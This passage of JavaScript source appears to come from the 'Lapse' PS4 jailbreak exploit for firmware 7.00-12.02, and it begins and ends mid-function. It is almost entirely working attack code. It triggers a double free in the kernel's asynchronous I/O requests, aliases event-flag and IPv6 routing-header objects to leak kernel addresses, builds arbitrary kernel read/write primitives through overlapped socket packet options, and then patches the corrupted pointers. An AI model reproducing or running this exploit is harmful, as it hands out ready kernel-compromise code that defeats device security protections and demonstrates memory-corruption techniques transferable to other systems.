  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('evf_set error: ' + hex(result));
  }
  return result;
}
function free_evf(id) {
  var result = evf_delete(id);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('evf_delete error: ' + hex(result));
  }
  return result;
}
function verify_reqs2(addr, cmd) {
  if (read32(addr) !== cmd) {
    return false;
  }
  var heap_prefixes = [];
  for (var i = 0x10; i <= 0x20; i += 8) {
    if (read16(addr.add(i + 6)) !== 0xffff) {
      return false;
    }
    heap_prefixes.push(Number(read16(addr.add(i + 4))));
  }
  var state1 = Number(read32(addr.add(0x38)));
  var state2 = Number(read32(addr.add(0x3c)));
  if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
    return false;
  }
  if (!read64(addr.add(0x40)).eq(0)) {
    return false;
  }
  for (var _i5 = 0x48; _i5 <= 0x50; _i5 += 8) {
    if (read16(addr.add(_i5 + 6)) === 0xffff) {
      if (read16(addr.add(_i5 + 4)) !== 0xffff) {
        heap_prefixes.push(Number(read16(addr.add(_i5 + 4))));
      }
    } else if (_i5 === 0x50 || !read64(addr.add(_i5)).eq(0)) {
      return false;
    }
  }
  if (heap_prefixes.length < 2) {
    return false;
  }
  var first_prefix = heap_prefixes[0];
  for (var idx = 1; idx < heap_prefixes.length; idx++) {
    if (heap_prefixes[idx] !== first_prefix) {
      return false;
    }
  }
  return true;
}
function leak_kernel_addrs(sd_pair, sds) {
  var sd = sd_pair[0];
  var buflen = 0x80 * LEAK_LEN;
  var buf = malloc(buflen);
  log('Confusing evf with rthdr...');
  var name = malloc(1);
  close(sd_pair[1]);
  var evf = null;
  for (var i = 1; i <= NUM_ALIAS; i++) {
    var evfs = [];
    for (var j = 1; j <= NUM_HANDLES; j++) {
      var evf_flags = 0xf00 | j << 16;
      evfs.push(new_evf(name, evf_flags));
    }
    get_rthdr(sd, buf, 0x80);
    var flag = read32(buf);
    if ((flag & 0xf00) === 0xf00) {
      var idx = flag >>> 16 & 0xffff;
      var expected_flag = flag | 1;
      evf = evfs[idx - 1];
      set_evf_flags(evf, expected_flag);
      get_rthdr(sd, buf, 0x80);
      var val = read32(buf);
      if (val === expected_flag) {
        evfs.splice(idx - 1, 1);
      } else {
        evf = null;
      }
    }
    for (var k = 0; k < evfs.length; k++) {
      if (evf === null || evfs[k] !== evf) {
        free_evf(evfs[k]);
      }
    }
    if (evf !== null) {
      log('Confused rthdr and evf at attempt: ' + i);
      break;
    }
  }
  if (evf === null) {
    log('Failed to confuse evf and rthdr');
    return null;
  }
  set_evf_flags(evf, 0xff00);
  var kernel_addr = read64(buf.add(0x28));
  log('"evf cv" string addr: ' + hex(kernel_addr));
  var kbuf_addr = read64(buf.add(0x40)).sub(0x38); // -0x38
  log('Kernel buffer addr: ' + hex(kbuf_addr));
  var wbufsz = 0x80;
  var wbuf = malloc(wbufsz);
  var rsize = build_rthdr(wbuf, wbufsz);
  var marker_val = 0xdeadbeef;
  var reqs3_offset = 0x10;
  write32(wbuf.add(4), marker_val);
  write32(wbuf.add(reqs3_offset + 0), 1); // .ar3_num_reqs
  write32(wbuf.add(reqs3_offset + 4), 0); // .ar3_reqs_left
  write32(wbuf.add(reqs3_offset + 8), AIO_STATE_COMPLETE); // .ar3_state
  write8(wbuf.add(reqs3_offset + 0xc), 0); // .ar3_done
  write32(wbuf.add(reqs3_offset + 0x28), 0x67b0000); // .ar3_lock.lock_object.lo_flags
  write64(wbuf.add(reqs3_offset + 0x38), 1); // .ar3_lock.lk_lock = LK_UNLOCKED

  var num_elems = 6;
  var ucred = kbuf_addr.add(4);
  var leak_reqs = make_reqs1(num_elems);
  write64(leak_reqs.add(0x10), ucred);
  var num_loop = NUM_SDS;
  var leak_ids_len = num_loop * num_elems;
  var leak_ids = malloc(4 * leak_ids_len);
  var step = 4 * num_elems;
  var cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;
  var reqs2_off = null;
  var fake_reqs3_off = null;
  var fake_reqs3_sd = null;
  for (var _i6 = 1; _i6 <= NUM_LEAKS; _i6++) {
    for (var _j = 1; _j <= num_loop; _j++) {
      write32(wbuf.add(8), _j);
      aio_submit_cmd(cmd, leak_reqs, num_elems, 3, new BigInt(Number(leak_ids) + (_j - 1) * step));
      set_rthdr(sds[_j - 1], wbuf, rsize);
    }
    get_rthdr(sd, buf, buflen);
    var sd_idx = null;
    reqs2_off = null;
    fake_reqs3_off = null;
    for (var off = 0x80; off < buflen; off += 0x80) {
      var offset = off;
      if (reqs2_off === null && verify_reqs2(buf.add(offset), AIO_CMD_WRITE)) {
        reqs2_off = off;
      }
      if (fake_reqs3_off === null) {
        var marker = read32(buf.add(offset + 4));
        if (marker === marker_val) {
          fake_reqs3_off = off;
          sd_idx = Number(read32(buf.add(offset + 8)));
        }
      }
    }
    if (reqs2_off !== null && fake_reqs3_off !== null && sd_idx !== null) {
      log('Found reqs2 and fake reqs3 at attempt: ' + _i6);
      fake_reqs3_sd = sds[sd_idx - 1];
      sds.splice(sd_idx - 1, 1);
      free_rthdrs(sds);
      sds.push(new_socket());
      break;
    }
    free_aios(leak_ids, leak_ids_len);
  }
  if (reqs2_off === null || fake_reqs3_off === null) {
    log('Could not leak reqs2 and fake reqs3');
    return null;
  }
  log('reqs2 offset: ' + hex(reqs2_off));
  log('fake reqs3 offset: ' + hex(fake_reqs3_off));
  get_rthdr(sd, buf, buflen);
  log('Leaked aio_entry:');
  var leak_str = '';
  for (var _i7 = 0; _i7 < 0x80; _i7 += 8) {
    if (_i7 % 16 === 0 && _i7 !== 0) leak_str += '\n';
    leak_str += hex(read64(buf.add(reqs2_off + _i7))) + ' ';
  }
  log(leak_str);
  var aio_info_addr = read64(buf.add(reqs2_off + 0x18));
  var reqs1_addr = read64(buf.add(reqs2_off + 0x10)).and(new BigInt(0xFFFFFFFF, 0xFFFFFF00));
  var fake_reqs3_addr = kbuf_addr.add(fake_reqs3_off + reqs3_offset);
  log('reqs1_addr = ' + hex(reqs1_addr));
  log('fake_reqs3_addr = ' + hex(fake_reqs3_addr));
  log('Searching for target_id...');
  var target_id = null;
  var to_cancel = null;
  var to_cancel_len = null;
  var errors = malloc(4 * num_elems);
  for (var _i8 = 0; _i8 < leak_ids_len; _i8 += num_elems) {
    aio_multi_cancel(new BigInt(Number(leak_ids) + _i8 * 4), num_elems, errors);
    get_rthdr(sd, buf, buflen);
    var state = read32(buf.add(reqs2_off + 0x38));
    if (state === AIO_STATE_ABORTED) {
      target_id = read32(leak_ids.add(_i8 * 4));
      write32(leak_ids.add(_i8 * 4), 0);
      log('Found target_id=' + hex(target_id) + ', i=' + _i8 + ', batch=' + Math.floor(_i8 / num_elems));
      var start = _i8 + num_elems;
      to_cancel = new BigInt(Number(leak_ids) + start * 4);
      to_cancel_len = leak_ids_len - start;
      break;
    }
  }
  if (target_id === null) {
    log('Target ID not found');
    return null;
  }
  if (to_cancel === null || to_cancel_len === null) {
    log('to_cancel not set');
    return null;
  }
  cancel_aios(to_cancel, to_cancel_len);
  free_aios2(leak_ids, leak_ids_len);
  log('Kernel addresses leaked successfully!');
  return {
    reqs1_addr,
    kbuf_addr,
    kernel_addr,
    target_id,
    evf,
    fake_reqs3_addr,
    fake_reqs3_sd,
    aio_info_addr
  };
}

// IPv6 kernel r/w primitive
var ipv6_kernel_rw = {
  data: {},
  ofiles: null,
  kread8: null,
  kwrite8: null,
  init: function (ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;
    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
  },
  get_fd_data_addr: function (fd) {
    var _kernel_offset;
    if (!((_kernel_offset = kernel_offset) !== null && _kernel_offset !== void 0 && _kernel_offset.SIZEOF_OFILES)) {
      throw new Error('kernel_offset not initialized');
    }
    if (!ipv6_kernel_rw.ofiles || !ipv6_kernel_rw.kread8) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    // PS4: ofiles is at offset 0x0, each entry is 0x8 bytes

    // Just in case fd is a bigint
    var fdNum = Number(fd);
    var filedescent_addr = ipv6_kernel_rw.ofiles.add(fdNum * kernel_offset.SIZEOF_OFILES);
    var file_addr = ipv6_kernel_rw.kread8(filedescent_addr.add(0x0));
    return ipv6_kernel_rw.kread8(file_addr.add(0x0));
  },
  create_pipe_pair: function () {
    var pipe = create_pipe();
    var read_fd = pipe[0];
    var write_fd = pipe[1];
    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
  },
  create_overlapped_ipv6_sockets: function () {
    var _kernel_offset2, _kernel_offset3;
    if (!((_kernel_offset2 = kernel_offset) !== null && _kernel_offset2 !== void 0 && _kernel_offset2.SO_PCB) || !((_kernel_offset3 = kernel_offset) !== null && _kernel_offset3 !== void 0 && _kernel_offset3.INPCB_PKTOPTS)) {
      throw new Error('kernel_offset not initialized');
    }
    if (!ipv6_kernel_rw.kread8 || !ipv6_kernel_rw.kwrite8) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    var master_target_buffer = malloc(0x14);
    var slave_buffer = malloc(0x14);
    var pktinfo_size_store = malloc(0x8);
    write64(pktinfo_size_store, 0x14);
    var master_sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    var victim_sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14);
    setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14);
    var master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
    var master_pcb = ipv6_kernel_rw.kread8(master_so.add(kernel_offset.SO_PCB));
    var master_pktopts = ipv6_kernel_rw.kread8(master_pcb.add(kernel_offset.INPCB_PKTOPTS));
    var slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    var slave_pcb = ipv6_kernel_rw.kread8(slave_so.add(kernel_offset.SO_PCB));
    var slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb.add(kernel_offset.INPCB_PKTOPTS));
    ipv6_kernel_rw.kwrite8(master_pktopts.add(0x10), slave_pktopts.add(0x10));
    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
  },
  ipv6_write_to_victim: function (kaddr) {
    if (!ipv6_kernel_rw.data.master_target_buffer || !ipv6_kernel_rw.data.master_sock) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    write64(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64(ipv6_kernel_rw.data.master_target_buffer.add(0x8), 0);
    write32(ipv6_kernel_rw.data.master_target_buffer.add(0x10), 0);
    setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14);
  },
  ipv6_kread: function (kaddr, buffer_addr) {
    if (!ipv6_kernel_rw.data.victim_sock || !ipv6_kernel_rw.data.pktinfo_size_store) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
  },
  ipv6_kwrite: function (kaddr, buffer_addr) {
    if (!ipv6_kernel_rw.data.victim_sock) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14);
  },
  ipv6_kread8: function (kaddr) {
    if (!ipv6_kernel_rw.data.slave_buffer) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64(ipv6_kernel_rw.data.slave_buffer);
  },
  copyout: function (kaddr, uaddr, len) {
    if (kaddr === null || kaddr === undefined || uaddr === null || uaddr === undefined || len === null || len === undefined || len.eq(0)) {
      throw new Error('copyout: invalid arguments');
    }
    if (!ipv6_kernel_rw.data.pipe_read_fd || !ipv6_kernel_rw.data.pipemap_buffer || !ipv6_kernel_rw.data.pipe_addr) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    write64(ipv6_kernel_rw.data.pipemap_buffer, new BigInt(0x40000000, 0x40000000));
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), new BigInt(0x40000000, 0x00000000));
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), 0);
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr.add(0x10), ipv6_kernel_rw.data.pipemap_buffer);
    read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
  },
  copyin: function (uaddr, kaddr, len) {
    if (kaddr === null || kaddr === undefined || uaddr === null || uaddr === undefined || len === null || len === undefined || len.eq(0)) {
      throw new Error('copyin: invalid arguments');
    }
    if (!ipv6_kernel_rw.data.pipemap_buffer || !ipv6_kernel_rw.data.pipe_addr || !ipv6_kernel_rw.data.pipe_write_fd) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    write64(ipv6_kernel_rw.data.pipemap_buffer, 0);
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), new BigInt(0x40000000, 0x00000000));
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), 0);
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr.add(0x10), ipv6_kernel_rw.data.pipemap_buffer);
    write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
  },
  read_buffer: function (kaddr, len) {
    if (!ipv6_kernel_rw.data.read_mem) {
      throw new Error('ipv6_kernel_rw not initialized');
    }
    var mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
      mem = malloc(len);
    }
    ipv6_kernel_rw.copyout(kaddr, mem, new BigInt(len));
    return read_buffer(mem, len);
  },
  write_buffer: function (kaddr, buf) {
    var temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, new BigInt(buf.length));
  }
};
function read_buffer(addr, len) {
  var buffer = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
    buffer[i] = Number(read8(addr.add(i)));
  }
  return buffer;
}
function read_cstring(addr) {
  var str = '';
  var i = 0;
  while (true) {
    var c = Number(read8(addr.add(i)));
    if (c === 0) break;
    str += String.fromCharCode(c);
    i++;
    if (i > 256) break; // Safety limit
  }
  return str;
}
function write_buffer(addr, buffer) {
  for (var i = 0; i < buffer.length; i++) {
    write8(addr.add(i), buffer[i]);
  }
}
function make_aliased_pktopts(sds) {
  var tclass = malloc(4);
  for (var loop = 0; loop < NUM_ALIAS; loop++) {
    for (var i = 0; i < sds.length; i++) {
      write32(tclass, i);
      set_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
    }
    for (var _i9 = 0; _i9 < sds.length; _i9++) {
      get_sockopt(sds[_i9], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
      var marker = Number(read32(tclass));
      if (marker !== _i9) {
        var _sd_pair4 = [sds[_i9], sds[marker]];
        log('Aliased pktopts at attempt ' + loop + ' (pair: ' + _sd_pair4[0] + ', ' + _sd_pair4[1] + ')');
        if (marker > _i9) {
          sds.splice(marker, 1);
          sds.splice(_i9, 1);
        } else {
          sds.splice(_i9, 1);
          sds.splice(marker, 1);
        }
        for (var j = 0; j < 2; j++) {
          var sock_fd = new_socket();
          set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
          sds.push(sock_fd);
        }
        return _sd_pair4;
      }
    }
    for (var _i0 = 0; _i0 < sds.length; _i0++) {
      set_sockopt(sds[_i0], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, new BigInt(0), 0);
    }
  }
  return null;
}
function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
  var max_leak_len = 0xff + 1 << 3;
  var buf = malloc(max_leak_len);
  var num_elems = MAX_AIO_IDS;
  var aio_reqs = make_reqs1(num_elems);
  var num_batches = 1;
  var aio_ids_len = num_batches * num_elems;
  var aio_ids = malloc(4 * aio_ids_len);
  log('Overwriting rthdr with AIO queue entry...');
  var aio_not_found = true;
  free_evf(evf);
  for (var i = 0; i < NUM_CLOBBERS; i++) {
    spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true);
    var size_ret = get_rthdr(sd, buf, max_leak_len);
    var cmd = read32(buf);
    if (size_ret === 8 && cmd === AIO_CMD_READ) {
      log('Aliased at attempt ' + i);
      aio_not_found = false;
      cancel_aios(aio_ids, aio_ids_len);
      break;
    }
    free_aios(aio_ids, aio_ids_len, true);
  }
  if (aio_not_found) {
    log('Failed to overwrite rthdr');
    return null;
  }
  var reqs2_size = 0x80;
  var reqs2 = malloc(reqs2_size);
  var rsize = build_rthdr(reqs2, reqs2_size);
  write32(reqs2.add(4), 5); // ar2_ticket
  write64(reqs2.add(0x18), reqs1_addr); // ar2_info
  write64(reqs2.add(0x20), fake_reqs3_addr); // ar2_batch

  var states = malloc(4 * num_elems);
  var addr_cache = [];
  for (var _i1 = 0; _i1 < num_batches; _i1++) {
    addr_cache.push(aio_ids.add(_i1 * num_elems * 4));
  }
  log('Overwriting AIO queue entry with rthdr...');
  close(sd);
  function overwrite_aio_entry_with_rthdr() {
    for (var _i10 = 0; _i10 < NUM_ALIAS; _i10++) {
      for (var j = 0; j < sds.length; j++) {
        set_rthdr(sds[j], reqs2, rsize);
      }
      // log("before for batch = 0 ...")
      for (var batch = 0; batch < addr_cache.length; batch++) {
        for (var _j2 = 0; _j2 < num_elems; _j2++) {
          write32(states.add(_j2 * 4), 0xFFFFFFFF);
        }
        aio_multi_cancel_fun(addr_cache[batch], num_elems, states);
        var req_idx = -1;
        for (var _j3 = 0; _j3 < num_elems; _j3++) {
          var val = read32(states.add(_j3 * 4));
          if (val === AIO_STATE_COMPLETE) {
            req_idx = _j3;
            break;
          }
        }
        if (req_idx !== -1) {
          log('Found req_id at batch ' + batch + ', attempt ' + _i10);
          var aio_idx = batch * num_elems + req_idx;
          var req_id_p = aio_ids.add(aio_idx * 4);
          var _req_id = read32(req_id_p);
          aio_multi_poll_fun(req_id_p, 1, states);
          write32(req_id_p, 0);
          return _req_id;
        }
      }
    }
    return null;
  }
  var req_id = overwrite_aio_entry_with_rthdr();
  if (req_id === null) {
    log('Failed to overwrite AIO queue entry');
    return null;
  }
  free_aios2(aio_ids, aio_ids_len);
  var target_id_p = malloc(4);
  write32(target_id_p, target_id);
  aio_multi_poll_fun(target_id_p, 1, states);
  var sce_errs = malloc(8);
  write32(sce_errs, 0xFFFFFFFF); // -1
  write32(sce_errs.add(4), 0xFFFFFFFF); // -1

  var target_ids = malloc(8);
  write32(target_ids, req_id);
  write32(target_ids.add(4), target_id);
  log('Triggering double free...');
  aio_multi_delete_fun(target_ids, 2, sce_errs);
  log('Reclaiming memory...');
  var sd_pair = make_aliased_pktopts(sds_alt);
  var err1 = read32(sce_errs);
  var err2 = read32(sce_errs.add(4));
  write32(states, 0xFFFFFFFF); // -1
  write32(states.add(4), 0xFFFFFFFF); // -1

  aio_multi_poll_fun(target_ids, 2, states);
  var success = true;
  if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
    log('ERROR: Bad delete of corrupt AIO request');
    success = false;
  }
  if (err1 !== 0 || err1 !== err2) {
    log('ERROR: Bad delete of ID pair');
    success = false;
  }
  if (!success) {
    log('Double free failed');
    return null;
  }
  if (sd_pair === null) {
    log('Failed to make aliased pktopts');
    return null;
  }
  return sd_pair;
}

// Stage 4

function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
  try {
    var kernelOffset = kernel_offset;
    if (!kernelOffset) {
      throw new Error('kernel_offset not initialized');
    }
    var master_sock = pktopts_sds[0];
    var tclass = malloc(4);
    var off_tclass = kernelOffset.IP6PO_TCLASS;
    var pktopts_size = 0x100;
    var pktopts = malloc(pktopts_size);
    var rsize = build_rthdr(pktopts, pktopts_size);
    var pktinfo_p = reqs1_addr.add(0x10);

    // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    write64(pktopts.add(0x10), pktinfo_p);
    log('Overwriting main pktopts');
    var reclaim_sock = null;
    close(pktopts_sds[1]);
    for (var i = 1; i <= NUM_ALIAS; i++) {
      for (var j = 0; j < sds_alt.length; j++) {
        write32(pktopts.add(off_tclass), 0x4141 | j << 16);
        set_rthdr(sds_alt[j], pktopts, rsize);
      }
      get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
      var marker = read32(tclass);
      if ((marker & 0xffff) === 0x4141) {
        log('Found reclaim socket at attempt: ' + i);
        var idx = Number(marker >> 16);
        reclaim_sock = sds_alt[idx];
        sds_alt.splice(idx, 1);
        break;
      }
    }
    if (reclaim_sock === null) {
      log('Failed to overwrite main pktopts');
      return null;
    }
    var pktinfo_len = 0x14;
    var pktinfo = malloc(pktinfo_len);
    write64(pktinfo, pktinfo_p);
    var read_buf = malloc(8);
    var slow_kread8 = addr => {
      var len = 8;
      var offset = 0;
      while (offset < len) {
        // pktopts.ip6po_nhinfo = addr + offset
        write64(pktinfo.add(8), addr.add(offset));
        set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
        var n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf.add(offset), len - offset);
        if (n === 0) {
          write8(read_buf.add(offset), 0);
          offset = offset + 1;
        } else {
          offset = offset + Number(n);
        }
      }
      return read64(read_buf);
    };
    var test_read = slow_kread8(kernel_addr);
    log('slow_kread8("evf cv"): ' + hex(test_read));
    var kstr = read_cstring(read_buf);
    log('*("evf cv"): ' + kstr);
    if (kstr !== 'evf cv') {
      log('Test read of "evf cv" failed');
      return null;
    }
    log('Slow arbitrary kernel read achieved');

    // Get curproc from previously freed aio_info
    var curproc = slow_kread8(aio_info_addr.add(8));
    if (Number(curproc.shr(48)) !== 0xffff) {
      log('Invalid curproc kernel address: ' + hex(curproc));
      return null;
    }
    var possible_pid = Number(slow_kread8(curproc.add(kernelOffset.PROC_PID)));
    var current_pid = Number(getpid());
    if ((possible_pid & 0xffffffff) !== (current_pid & 0xffffffff)) {
      log('curproc verification failed: ' + hex(curproc));
      return null;
    }
    log('curproc = ' + hex(curproc));
    kernel.addr.curproc = curproc;
    kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc.add(kernelOffset.PROC_FD));
    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd).add(kernelOffset.FILEDESC_OFILES);
    kernel.addr.inside_kdata = kernel_addr;
    var get_fd_data_addr = (sock, kread8_fn) => {
      var filedescent_addr = kernel.addr.curproc_ofiles.add(Number(sock) * kernelOffset.SIZEOF_OFILES);
      var file_addr = kread8_fn(filedescent_addr.add(0));
      return kread8_fn(file_addr.add(0));
    };
    var get_sock_pktopts = (sock, kread8_fn) => {
      var fd_data = get_fd_data_addr(sock, kread8_fn);
      var pcb = kread8_fn(fd_data.add(kernelOffset.SO_PCB));
      var pktopts = kread8_fn(pcb.add(kernelOffset.INPCB_PKTOPTS));
      return pktopts;
    };
    var worker_sock = new_socket();
    var worker_pktinfo = malloc(pktinfo_len);

    // Create pktopts on worker_sock
    set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len);
    var worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8);
    write64(pktinfo, worker_pktopts.add(0x10)); // overlap pktinfo
    write64(pktinfo.add(8), 0); // clear .ip6po_nexthop

    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
    var kread20 = (addr, buf) => {
      write64(pktinfo, addr);
      set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
      get_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
    };
    var kwrite20 = (addr, buf) => {
      write64(pktinfo, addr);
      set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
      set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
    };
    var kread8 = addr => {
      kread20(addr, worker_pktinfo);
      return read64(worker_pktinfo);
    };

    // Note: this will write our 8 bytes + remaining 12 bytes as null
    var restricted_kwrite8 = (addr, val) => {
      write64(worker_pktinfo, val);
      write64(worker_pktinfo.add(8), 0);
      write32(worker_pktinfo.add(16), 0);
      kwrite20(addr, worker_pktinfo);
    };
    write64(read_buf, kread8(kernel_addr));
    var kstr2 = read_cstring(read_buf);
    if (kstr2 !== 'evf cv') {
      log('Test read of "evf cv" failed');
      return null;
    }
    log('Restricted kernel r/w achieved');

    // Initialize ipv6_kernel_rw with restricted write
    ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);
    kernel.read_buffer = ipv6_kernel_rw.read_buffer;
    kernel.write_buffer = ipv6_kernel_rw.write_buffer;
    kernel.copyout = ipv6_kernel_rw.copyout;
    kernel.copyin = ipv6_kernel_rw.copyin;
    var kstr3 = kernel.read_null_terminated_string(kernel_addr);
    if (kstr3 !== 'evf cv') {
      log('Test read of "evf cv" failed');
      return null;
    }
    log('Arbitrary kernel r/w achieved!');

    // RESTORE: clean corrupt pointers
    var off_ip6po_rthdr = kernelOffset.IP6PO_RTHDR;
    for (var _i11 = 0; _i11 < sds.length; _i11++) {
      var sock_pktopts = get_sock_pktopts(sds[_i11], kernel.read_qword);
      kernel.write_qword(sock_pktopts.add(off_ip6po_rthdr), 0);
    }
    var reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword);
    kernel.write_qword(reclaimer_pktopts.add(off_ip6po_rthdr), 0);
    kernel.write_qword(worker_pktopts.add(off_ip6po_rthdr), 0);
    var sock_increase_ref = [ipv6_kernel_rw.data.master_sock, ipv6_kernel_rw.data.victim_sock, master_sock, worker_sock, reclaim_sock];

    // Increase ref counts to prevent deallocation
    for (var each of sock_increase_ref) {
      var sock_addr = get_fd_data_addr(each, kernel.read_qword);
      kernel.write_dword(sock_addr.add(0x0), 0x100); // so_count
    }
    log('Fixes applied');
    return true;
  } catch (e) {
    var _stack;
    log('make_kernel_arw error: ' + e.message);
    log((_stack = e.stack) !== null && _stack !== void 0 ? _stack : '');
    return null;
  }
}
function lapse() {
  try {
    log('=== PS4 Lapse Jailbreak ===');
    FW_VERSION = get_fwversion();
    log('Detected PS4 firmware: ' + FW_VERSION);
    if (FW_VERSION === null) {
      log('Failed to detect PS4 firmware version.\nAborting...');
      send_notification('Failed to detect PS4 firmware version.\nAborting...');
      return false;
    }
    var compare_version = (a, b) => {
      var a_arr = a.split('.');
      var amaj = Number(a_arr[0]);
      var amin = Number(a_arr[1]);
      var b_arr = b.split('.');
      var bmaj = Number(b_arr[0]);
      var bmin = Number(b_arr[1]);
      return amaj === bmaj ? amin - bmin : amaj - bmaj;
    };
    if (compare_version(FW_VERSION, '7.00') < 0 || compare_version(FW_VERSION, '12.02') > 0) {
      log('Unsupported PS4 firmware\nSupported: 7.00-12.02\nAborting...');
      send_notification('Unsupported PS4 firmware\nAborting...');
      return false;
    }
    kernel_offset = get_kernel_offset(FW_VERSION);
    log('Kernel offsets loaded for FW ' + FW_VERSION);

    // === STAGE 0: Setup ===
    log('=== STAGE 0: Setup ===');
    var setup_success = setup();
    if (!setup_success) {
      log('Setup failed');
      send_notification('Lapse: Setup failed');
      return false;
    }
    log('Setup completed');
    log('');
    log('=== STAGE 1: Double-free AIO ===');
    sd_pair = double_free_reqs2();
    if (sd_pair === null) {
      log('[FAILED] Stage 1');
      send_notification('Lapse: FAILED at Stage 1');
      return false;
    }
    log('Stage 1 completed');
    if (sds === null) {
      log('Failed to create socket list');
      send_notification('Lapse: FAILED at Stage 1 (sds creation)');
      return false;
    }
    log('');
    log('=== STAGE 2: Leak kernel addresses ===');
    var leak_result = leak_kernel_addrs(sd_pair, sds);
    if (leak_result === null) {
      log('Stage 2 kernel address leak failed');
      cleanup_fail();
      return false;
    }
    log('Stage 2 completed');
    log('Leaked addresses:');
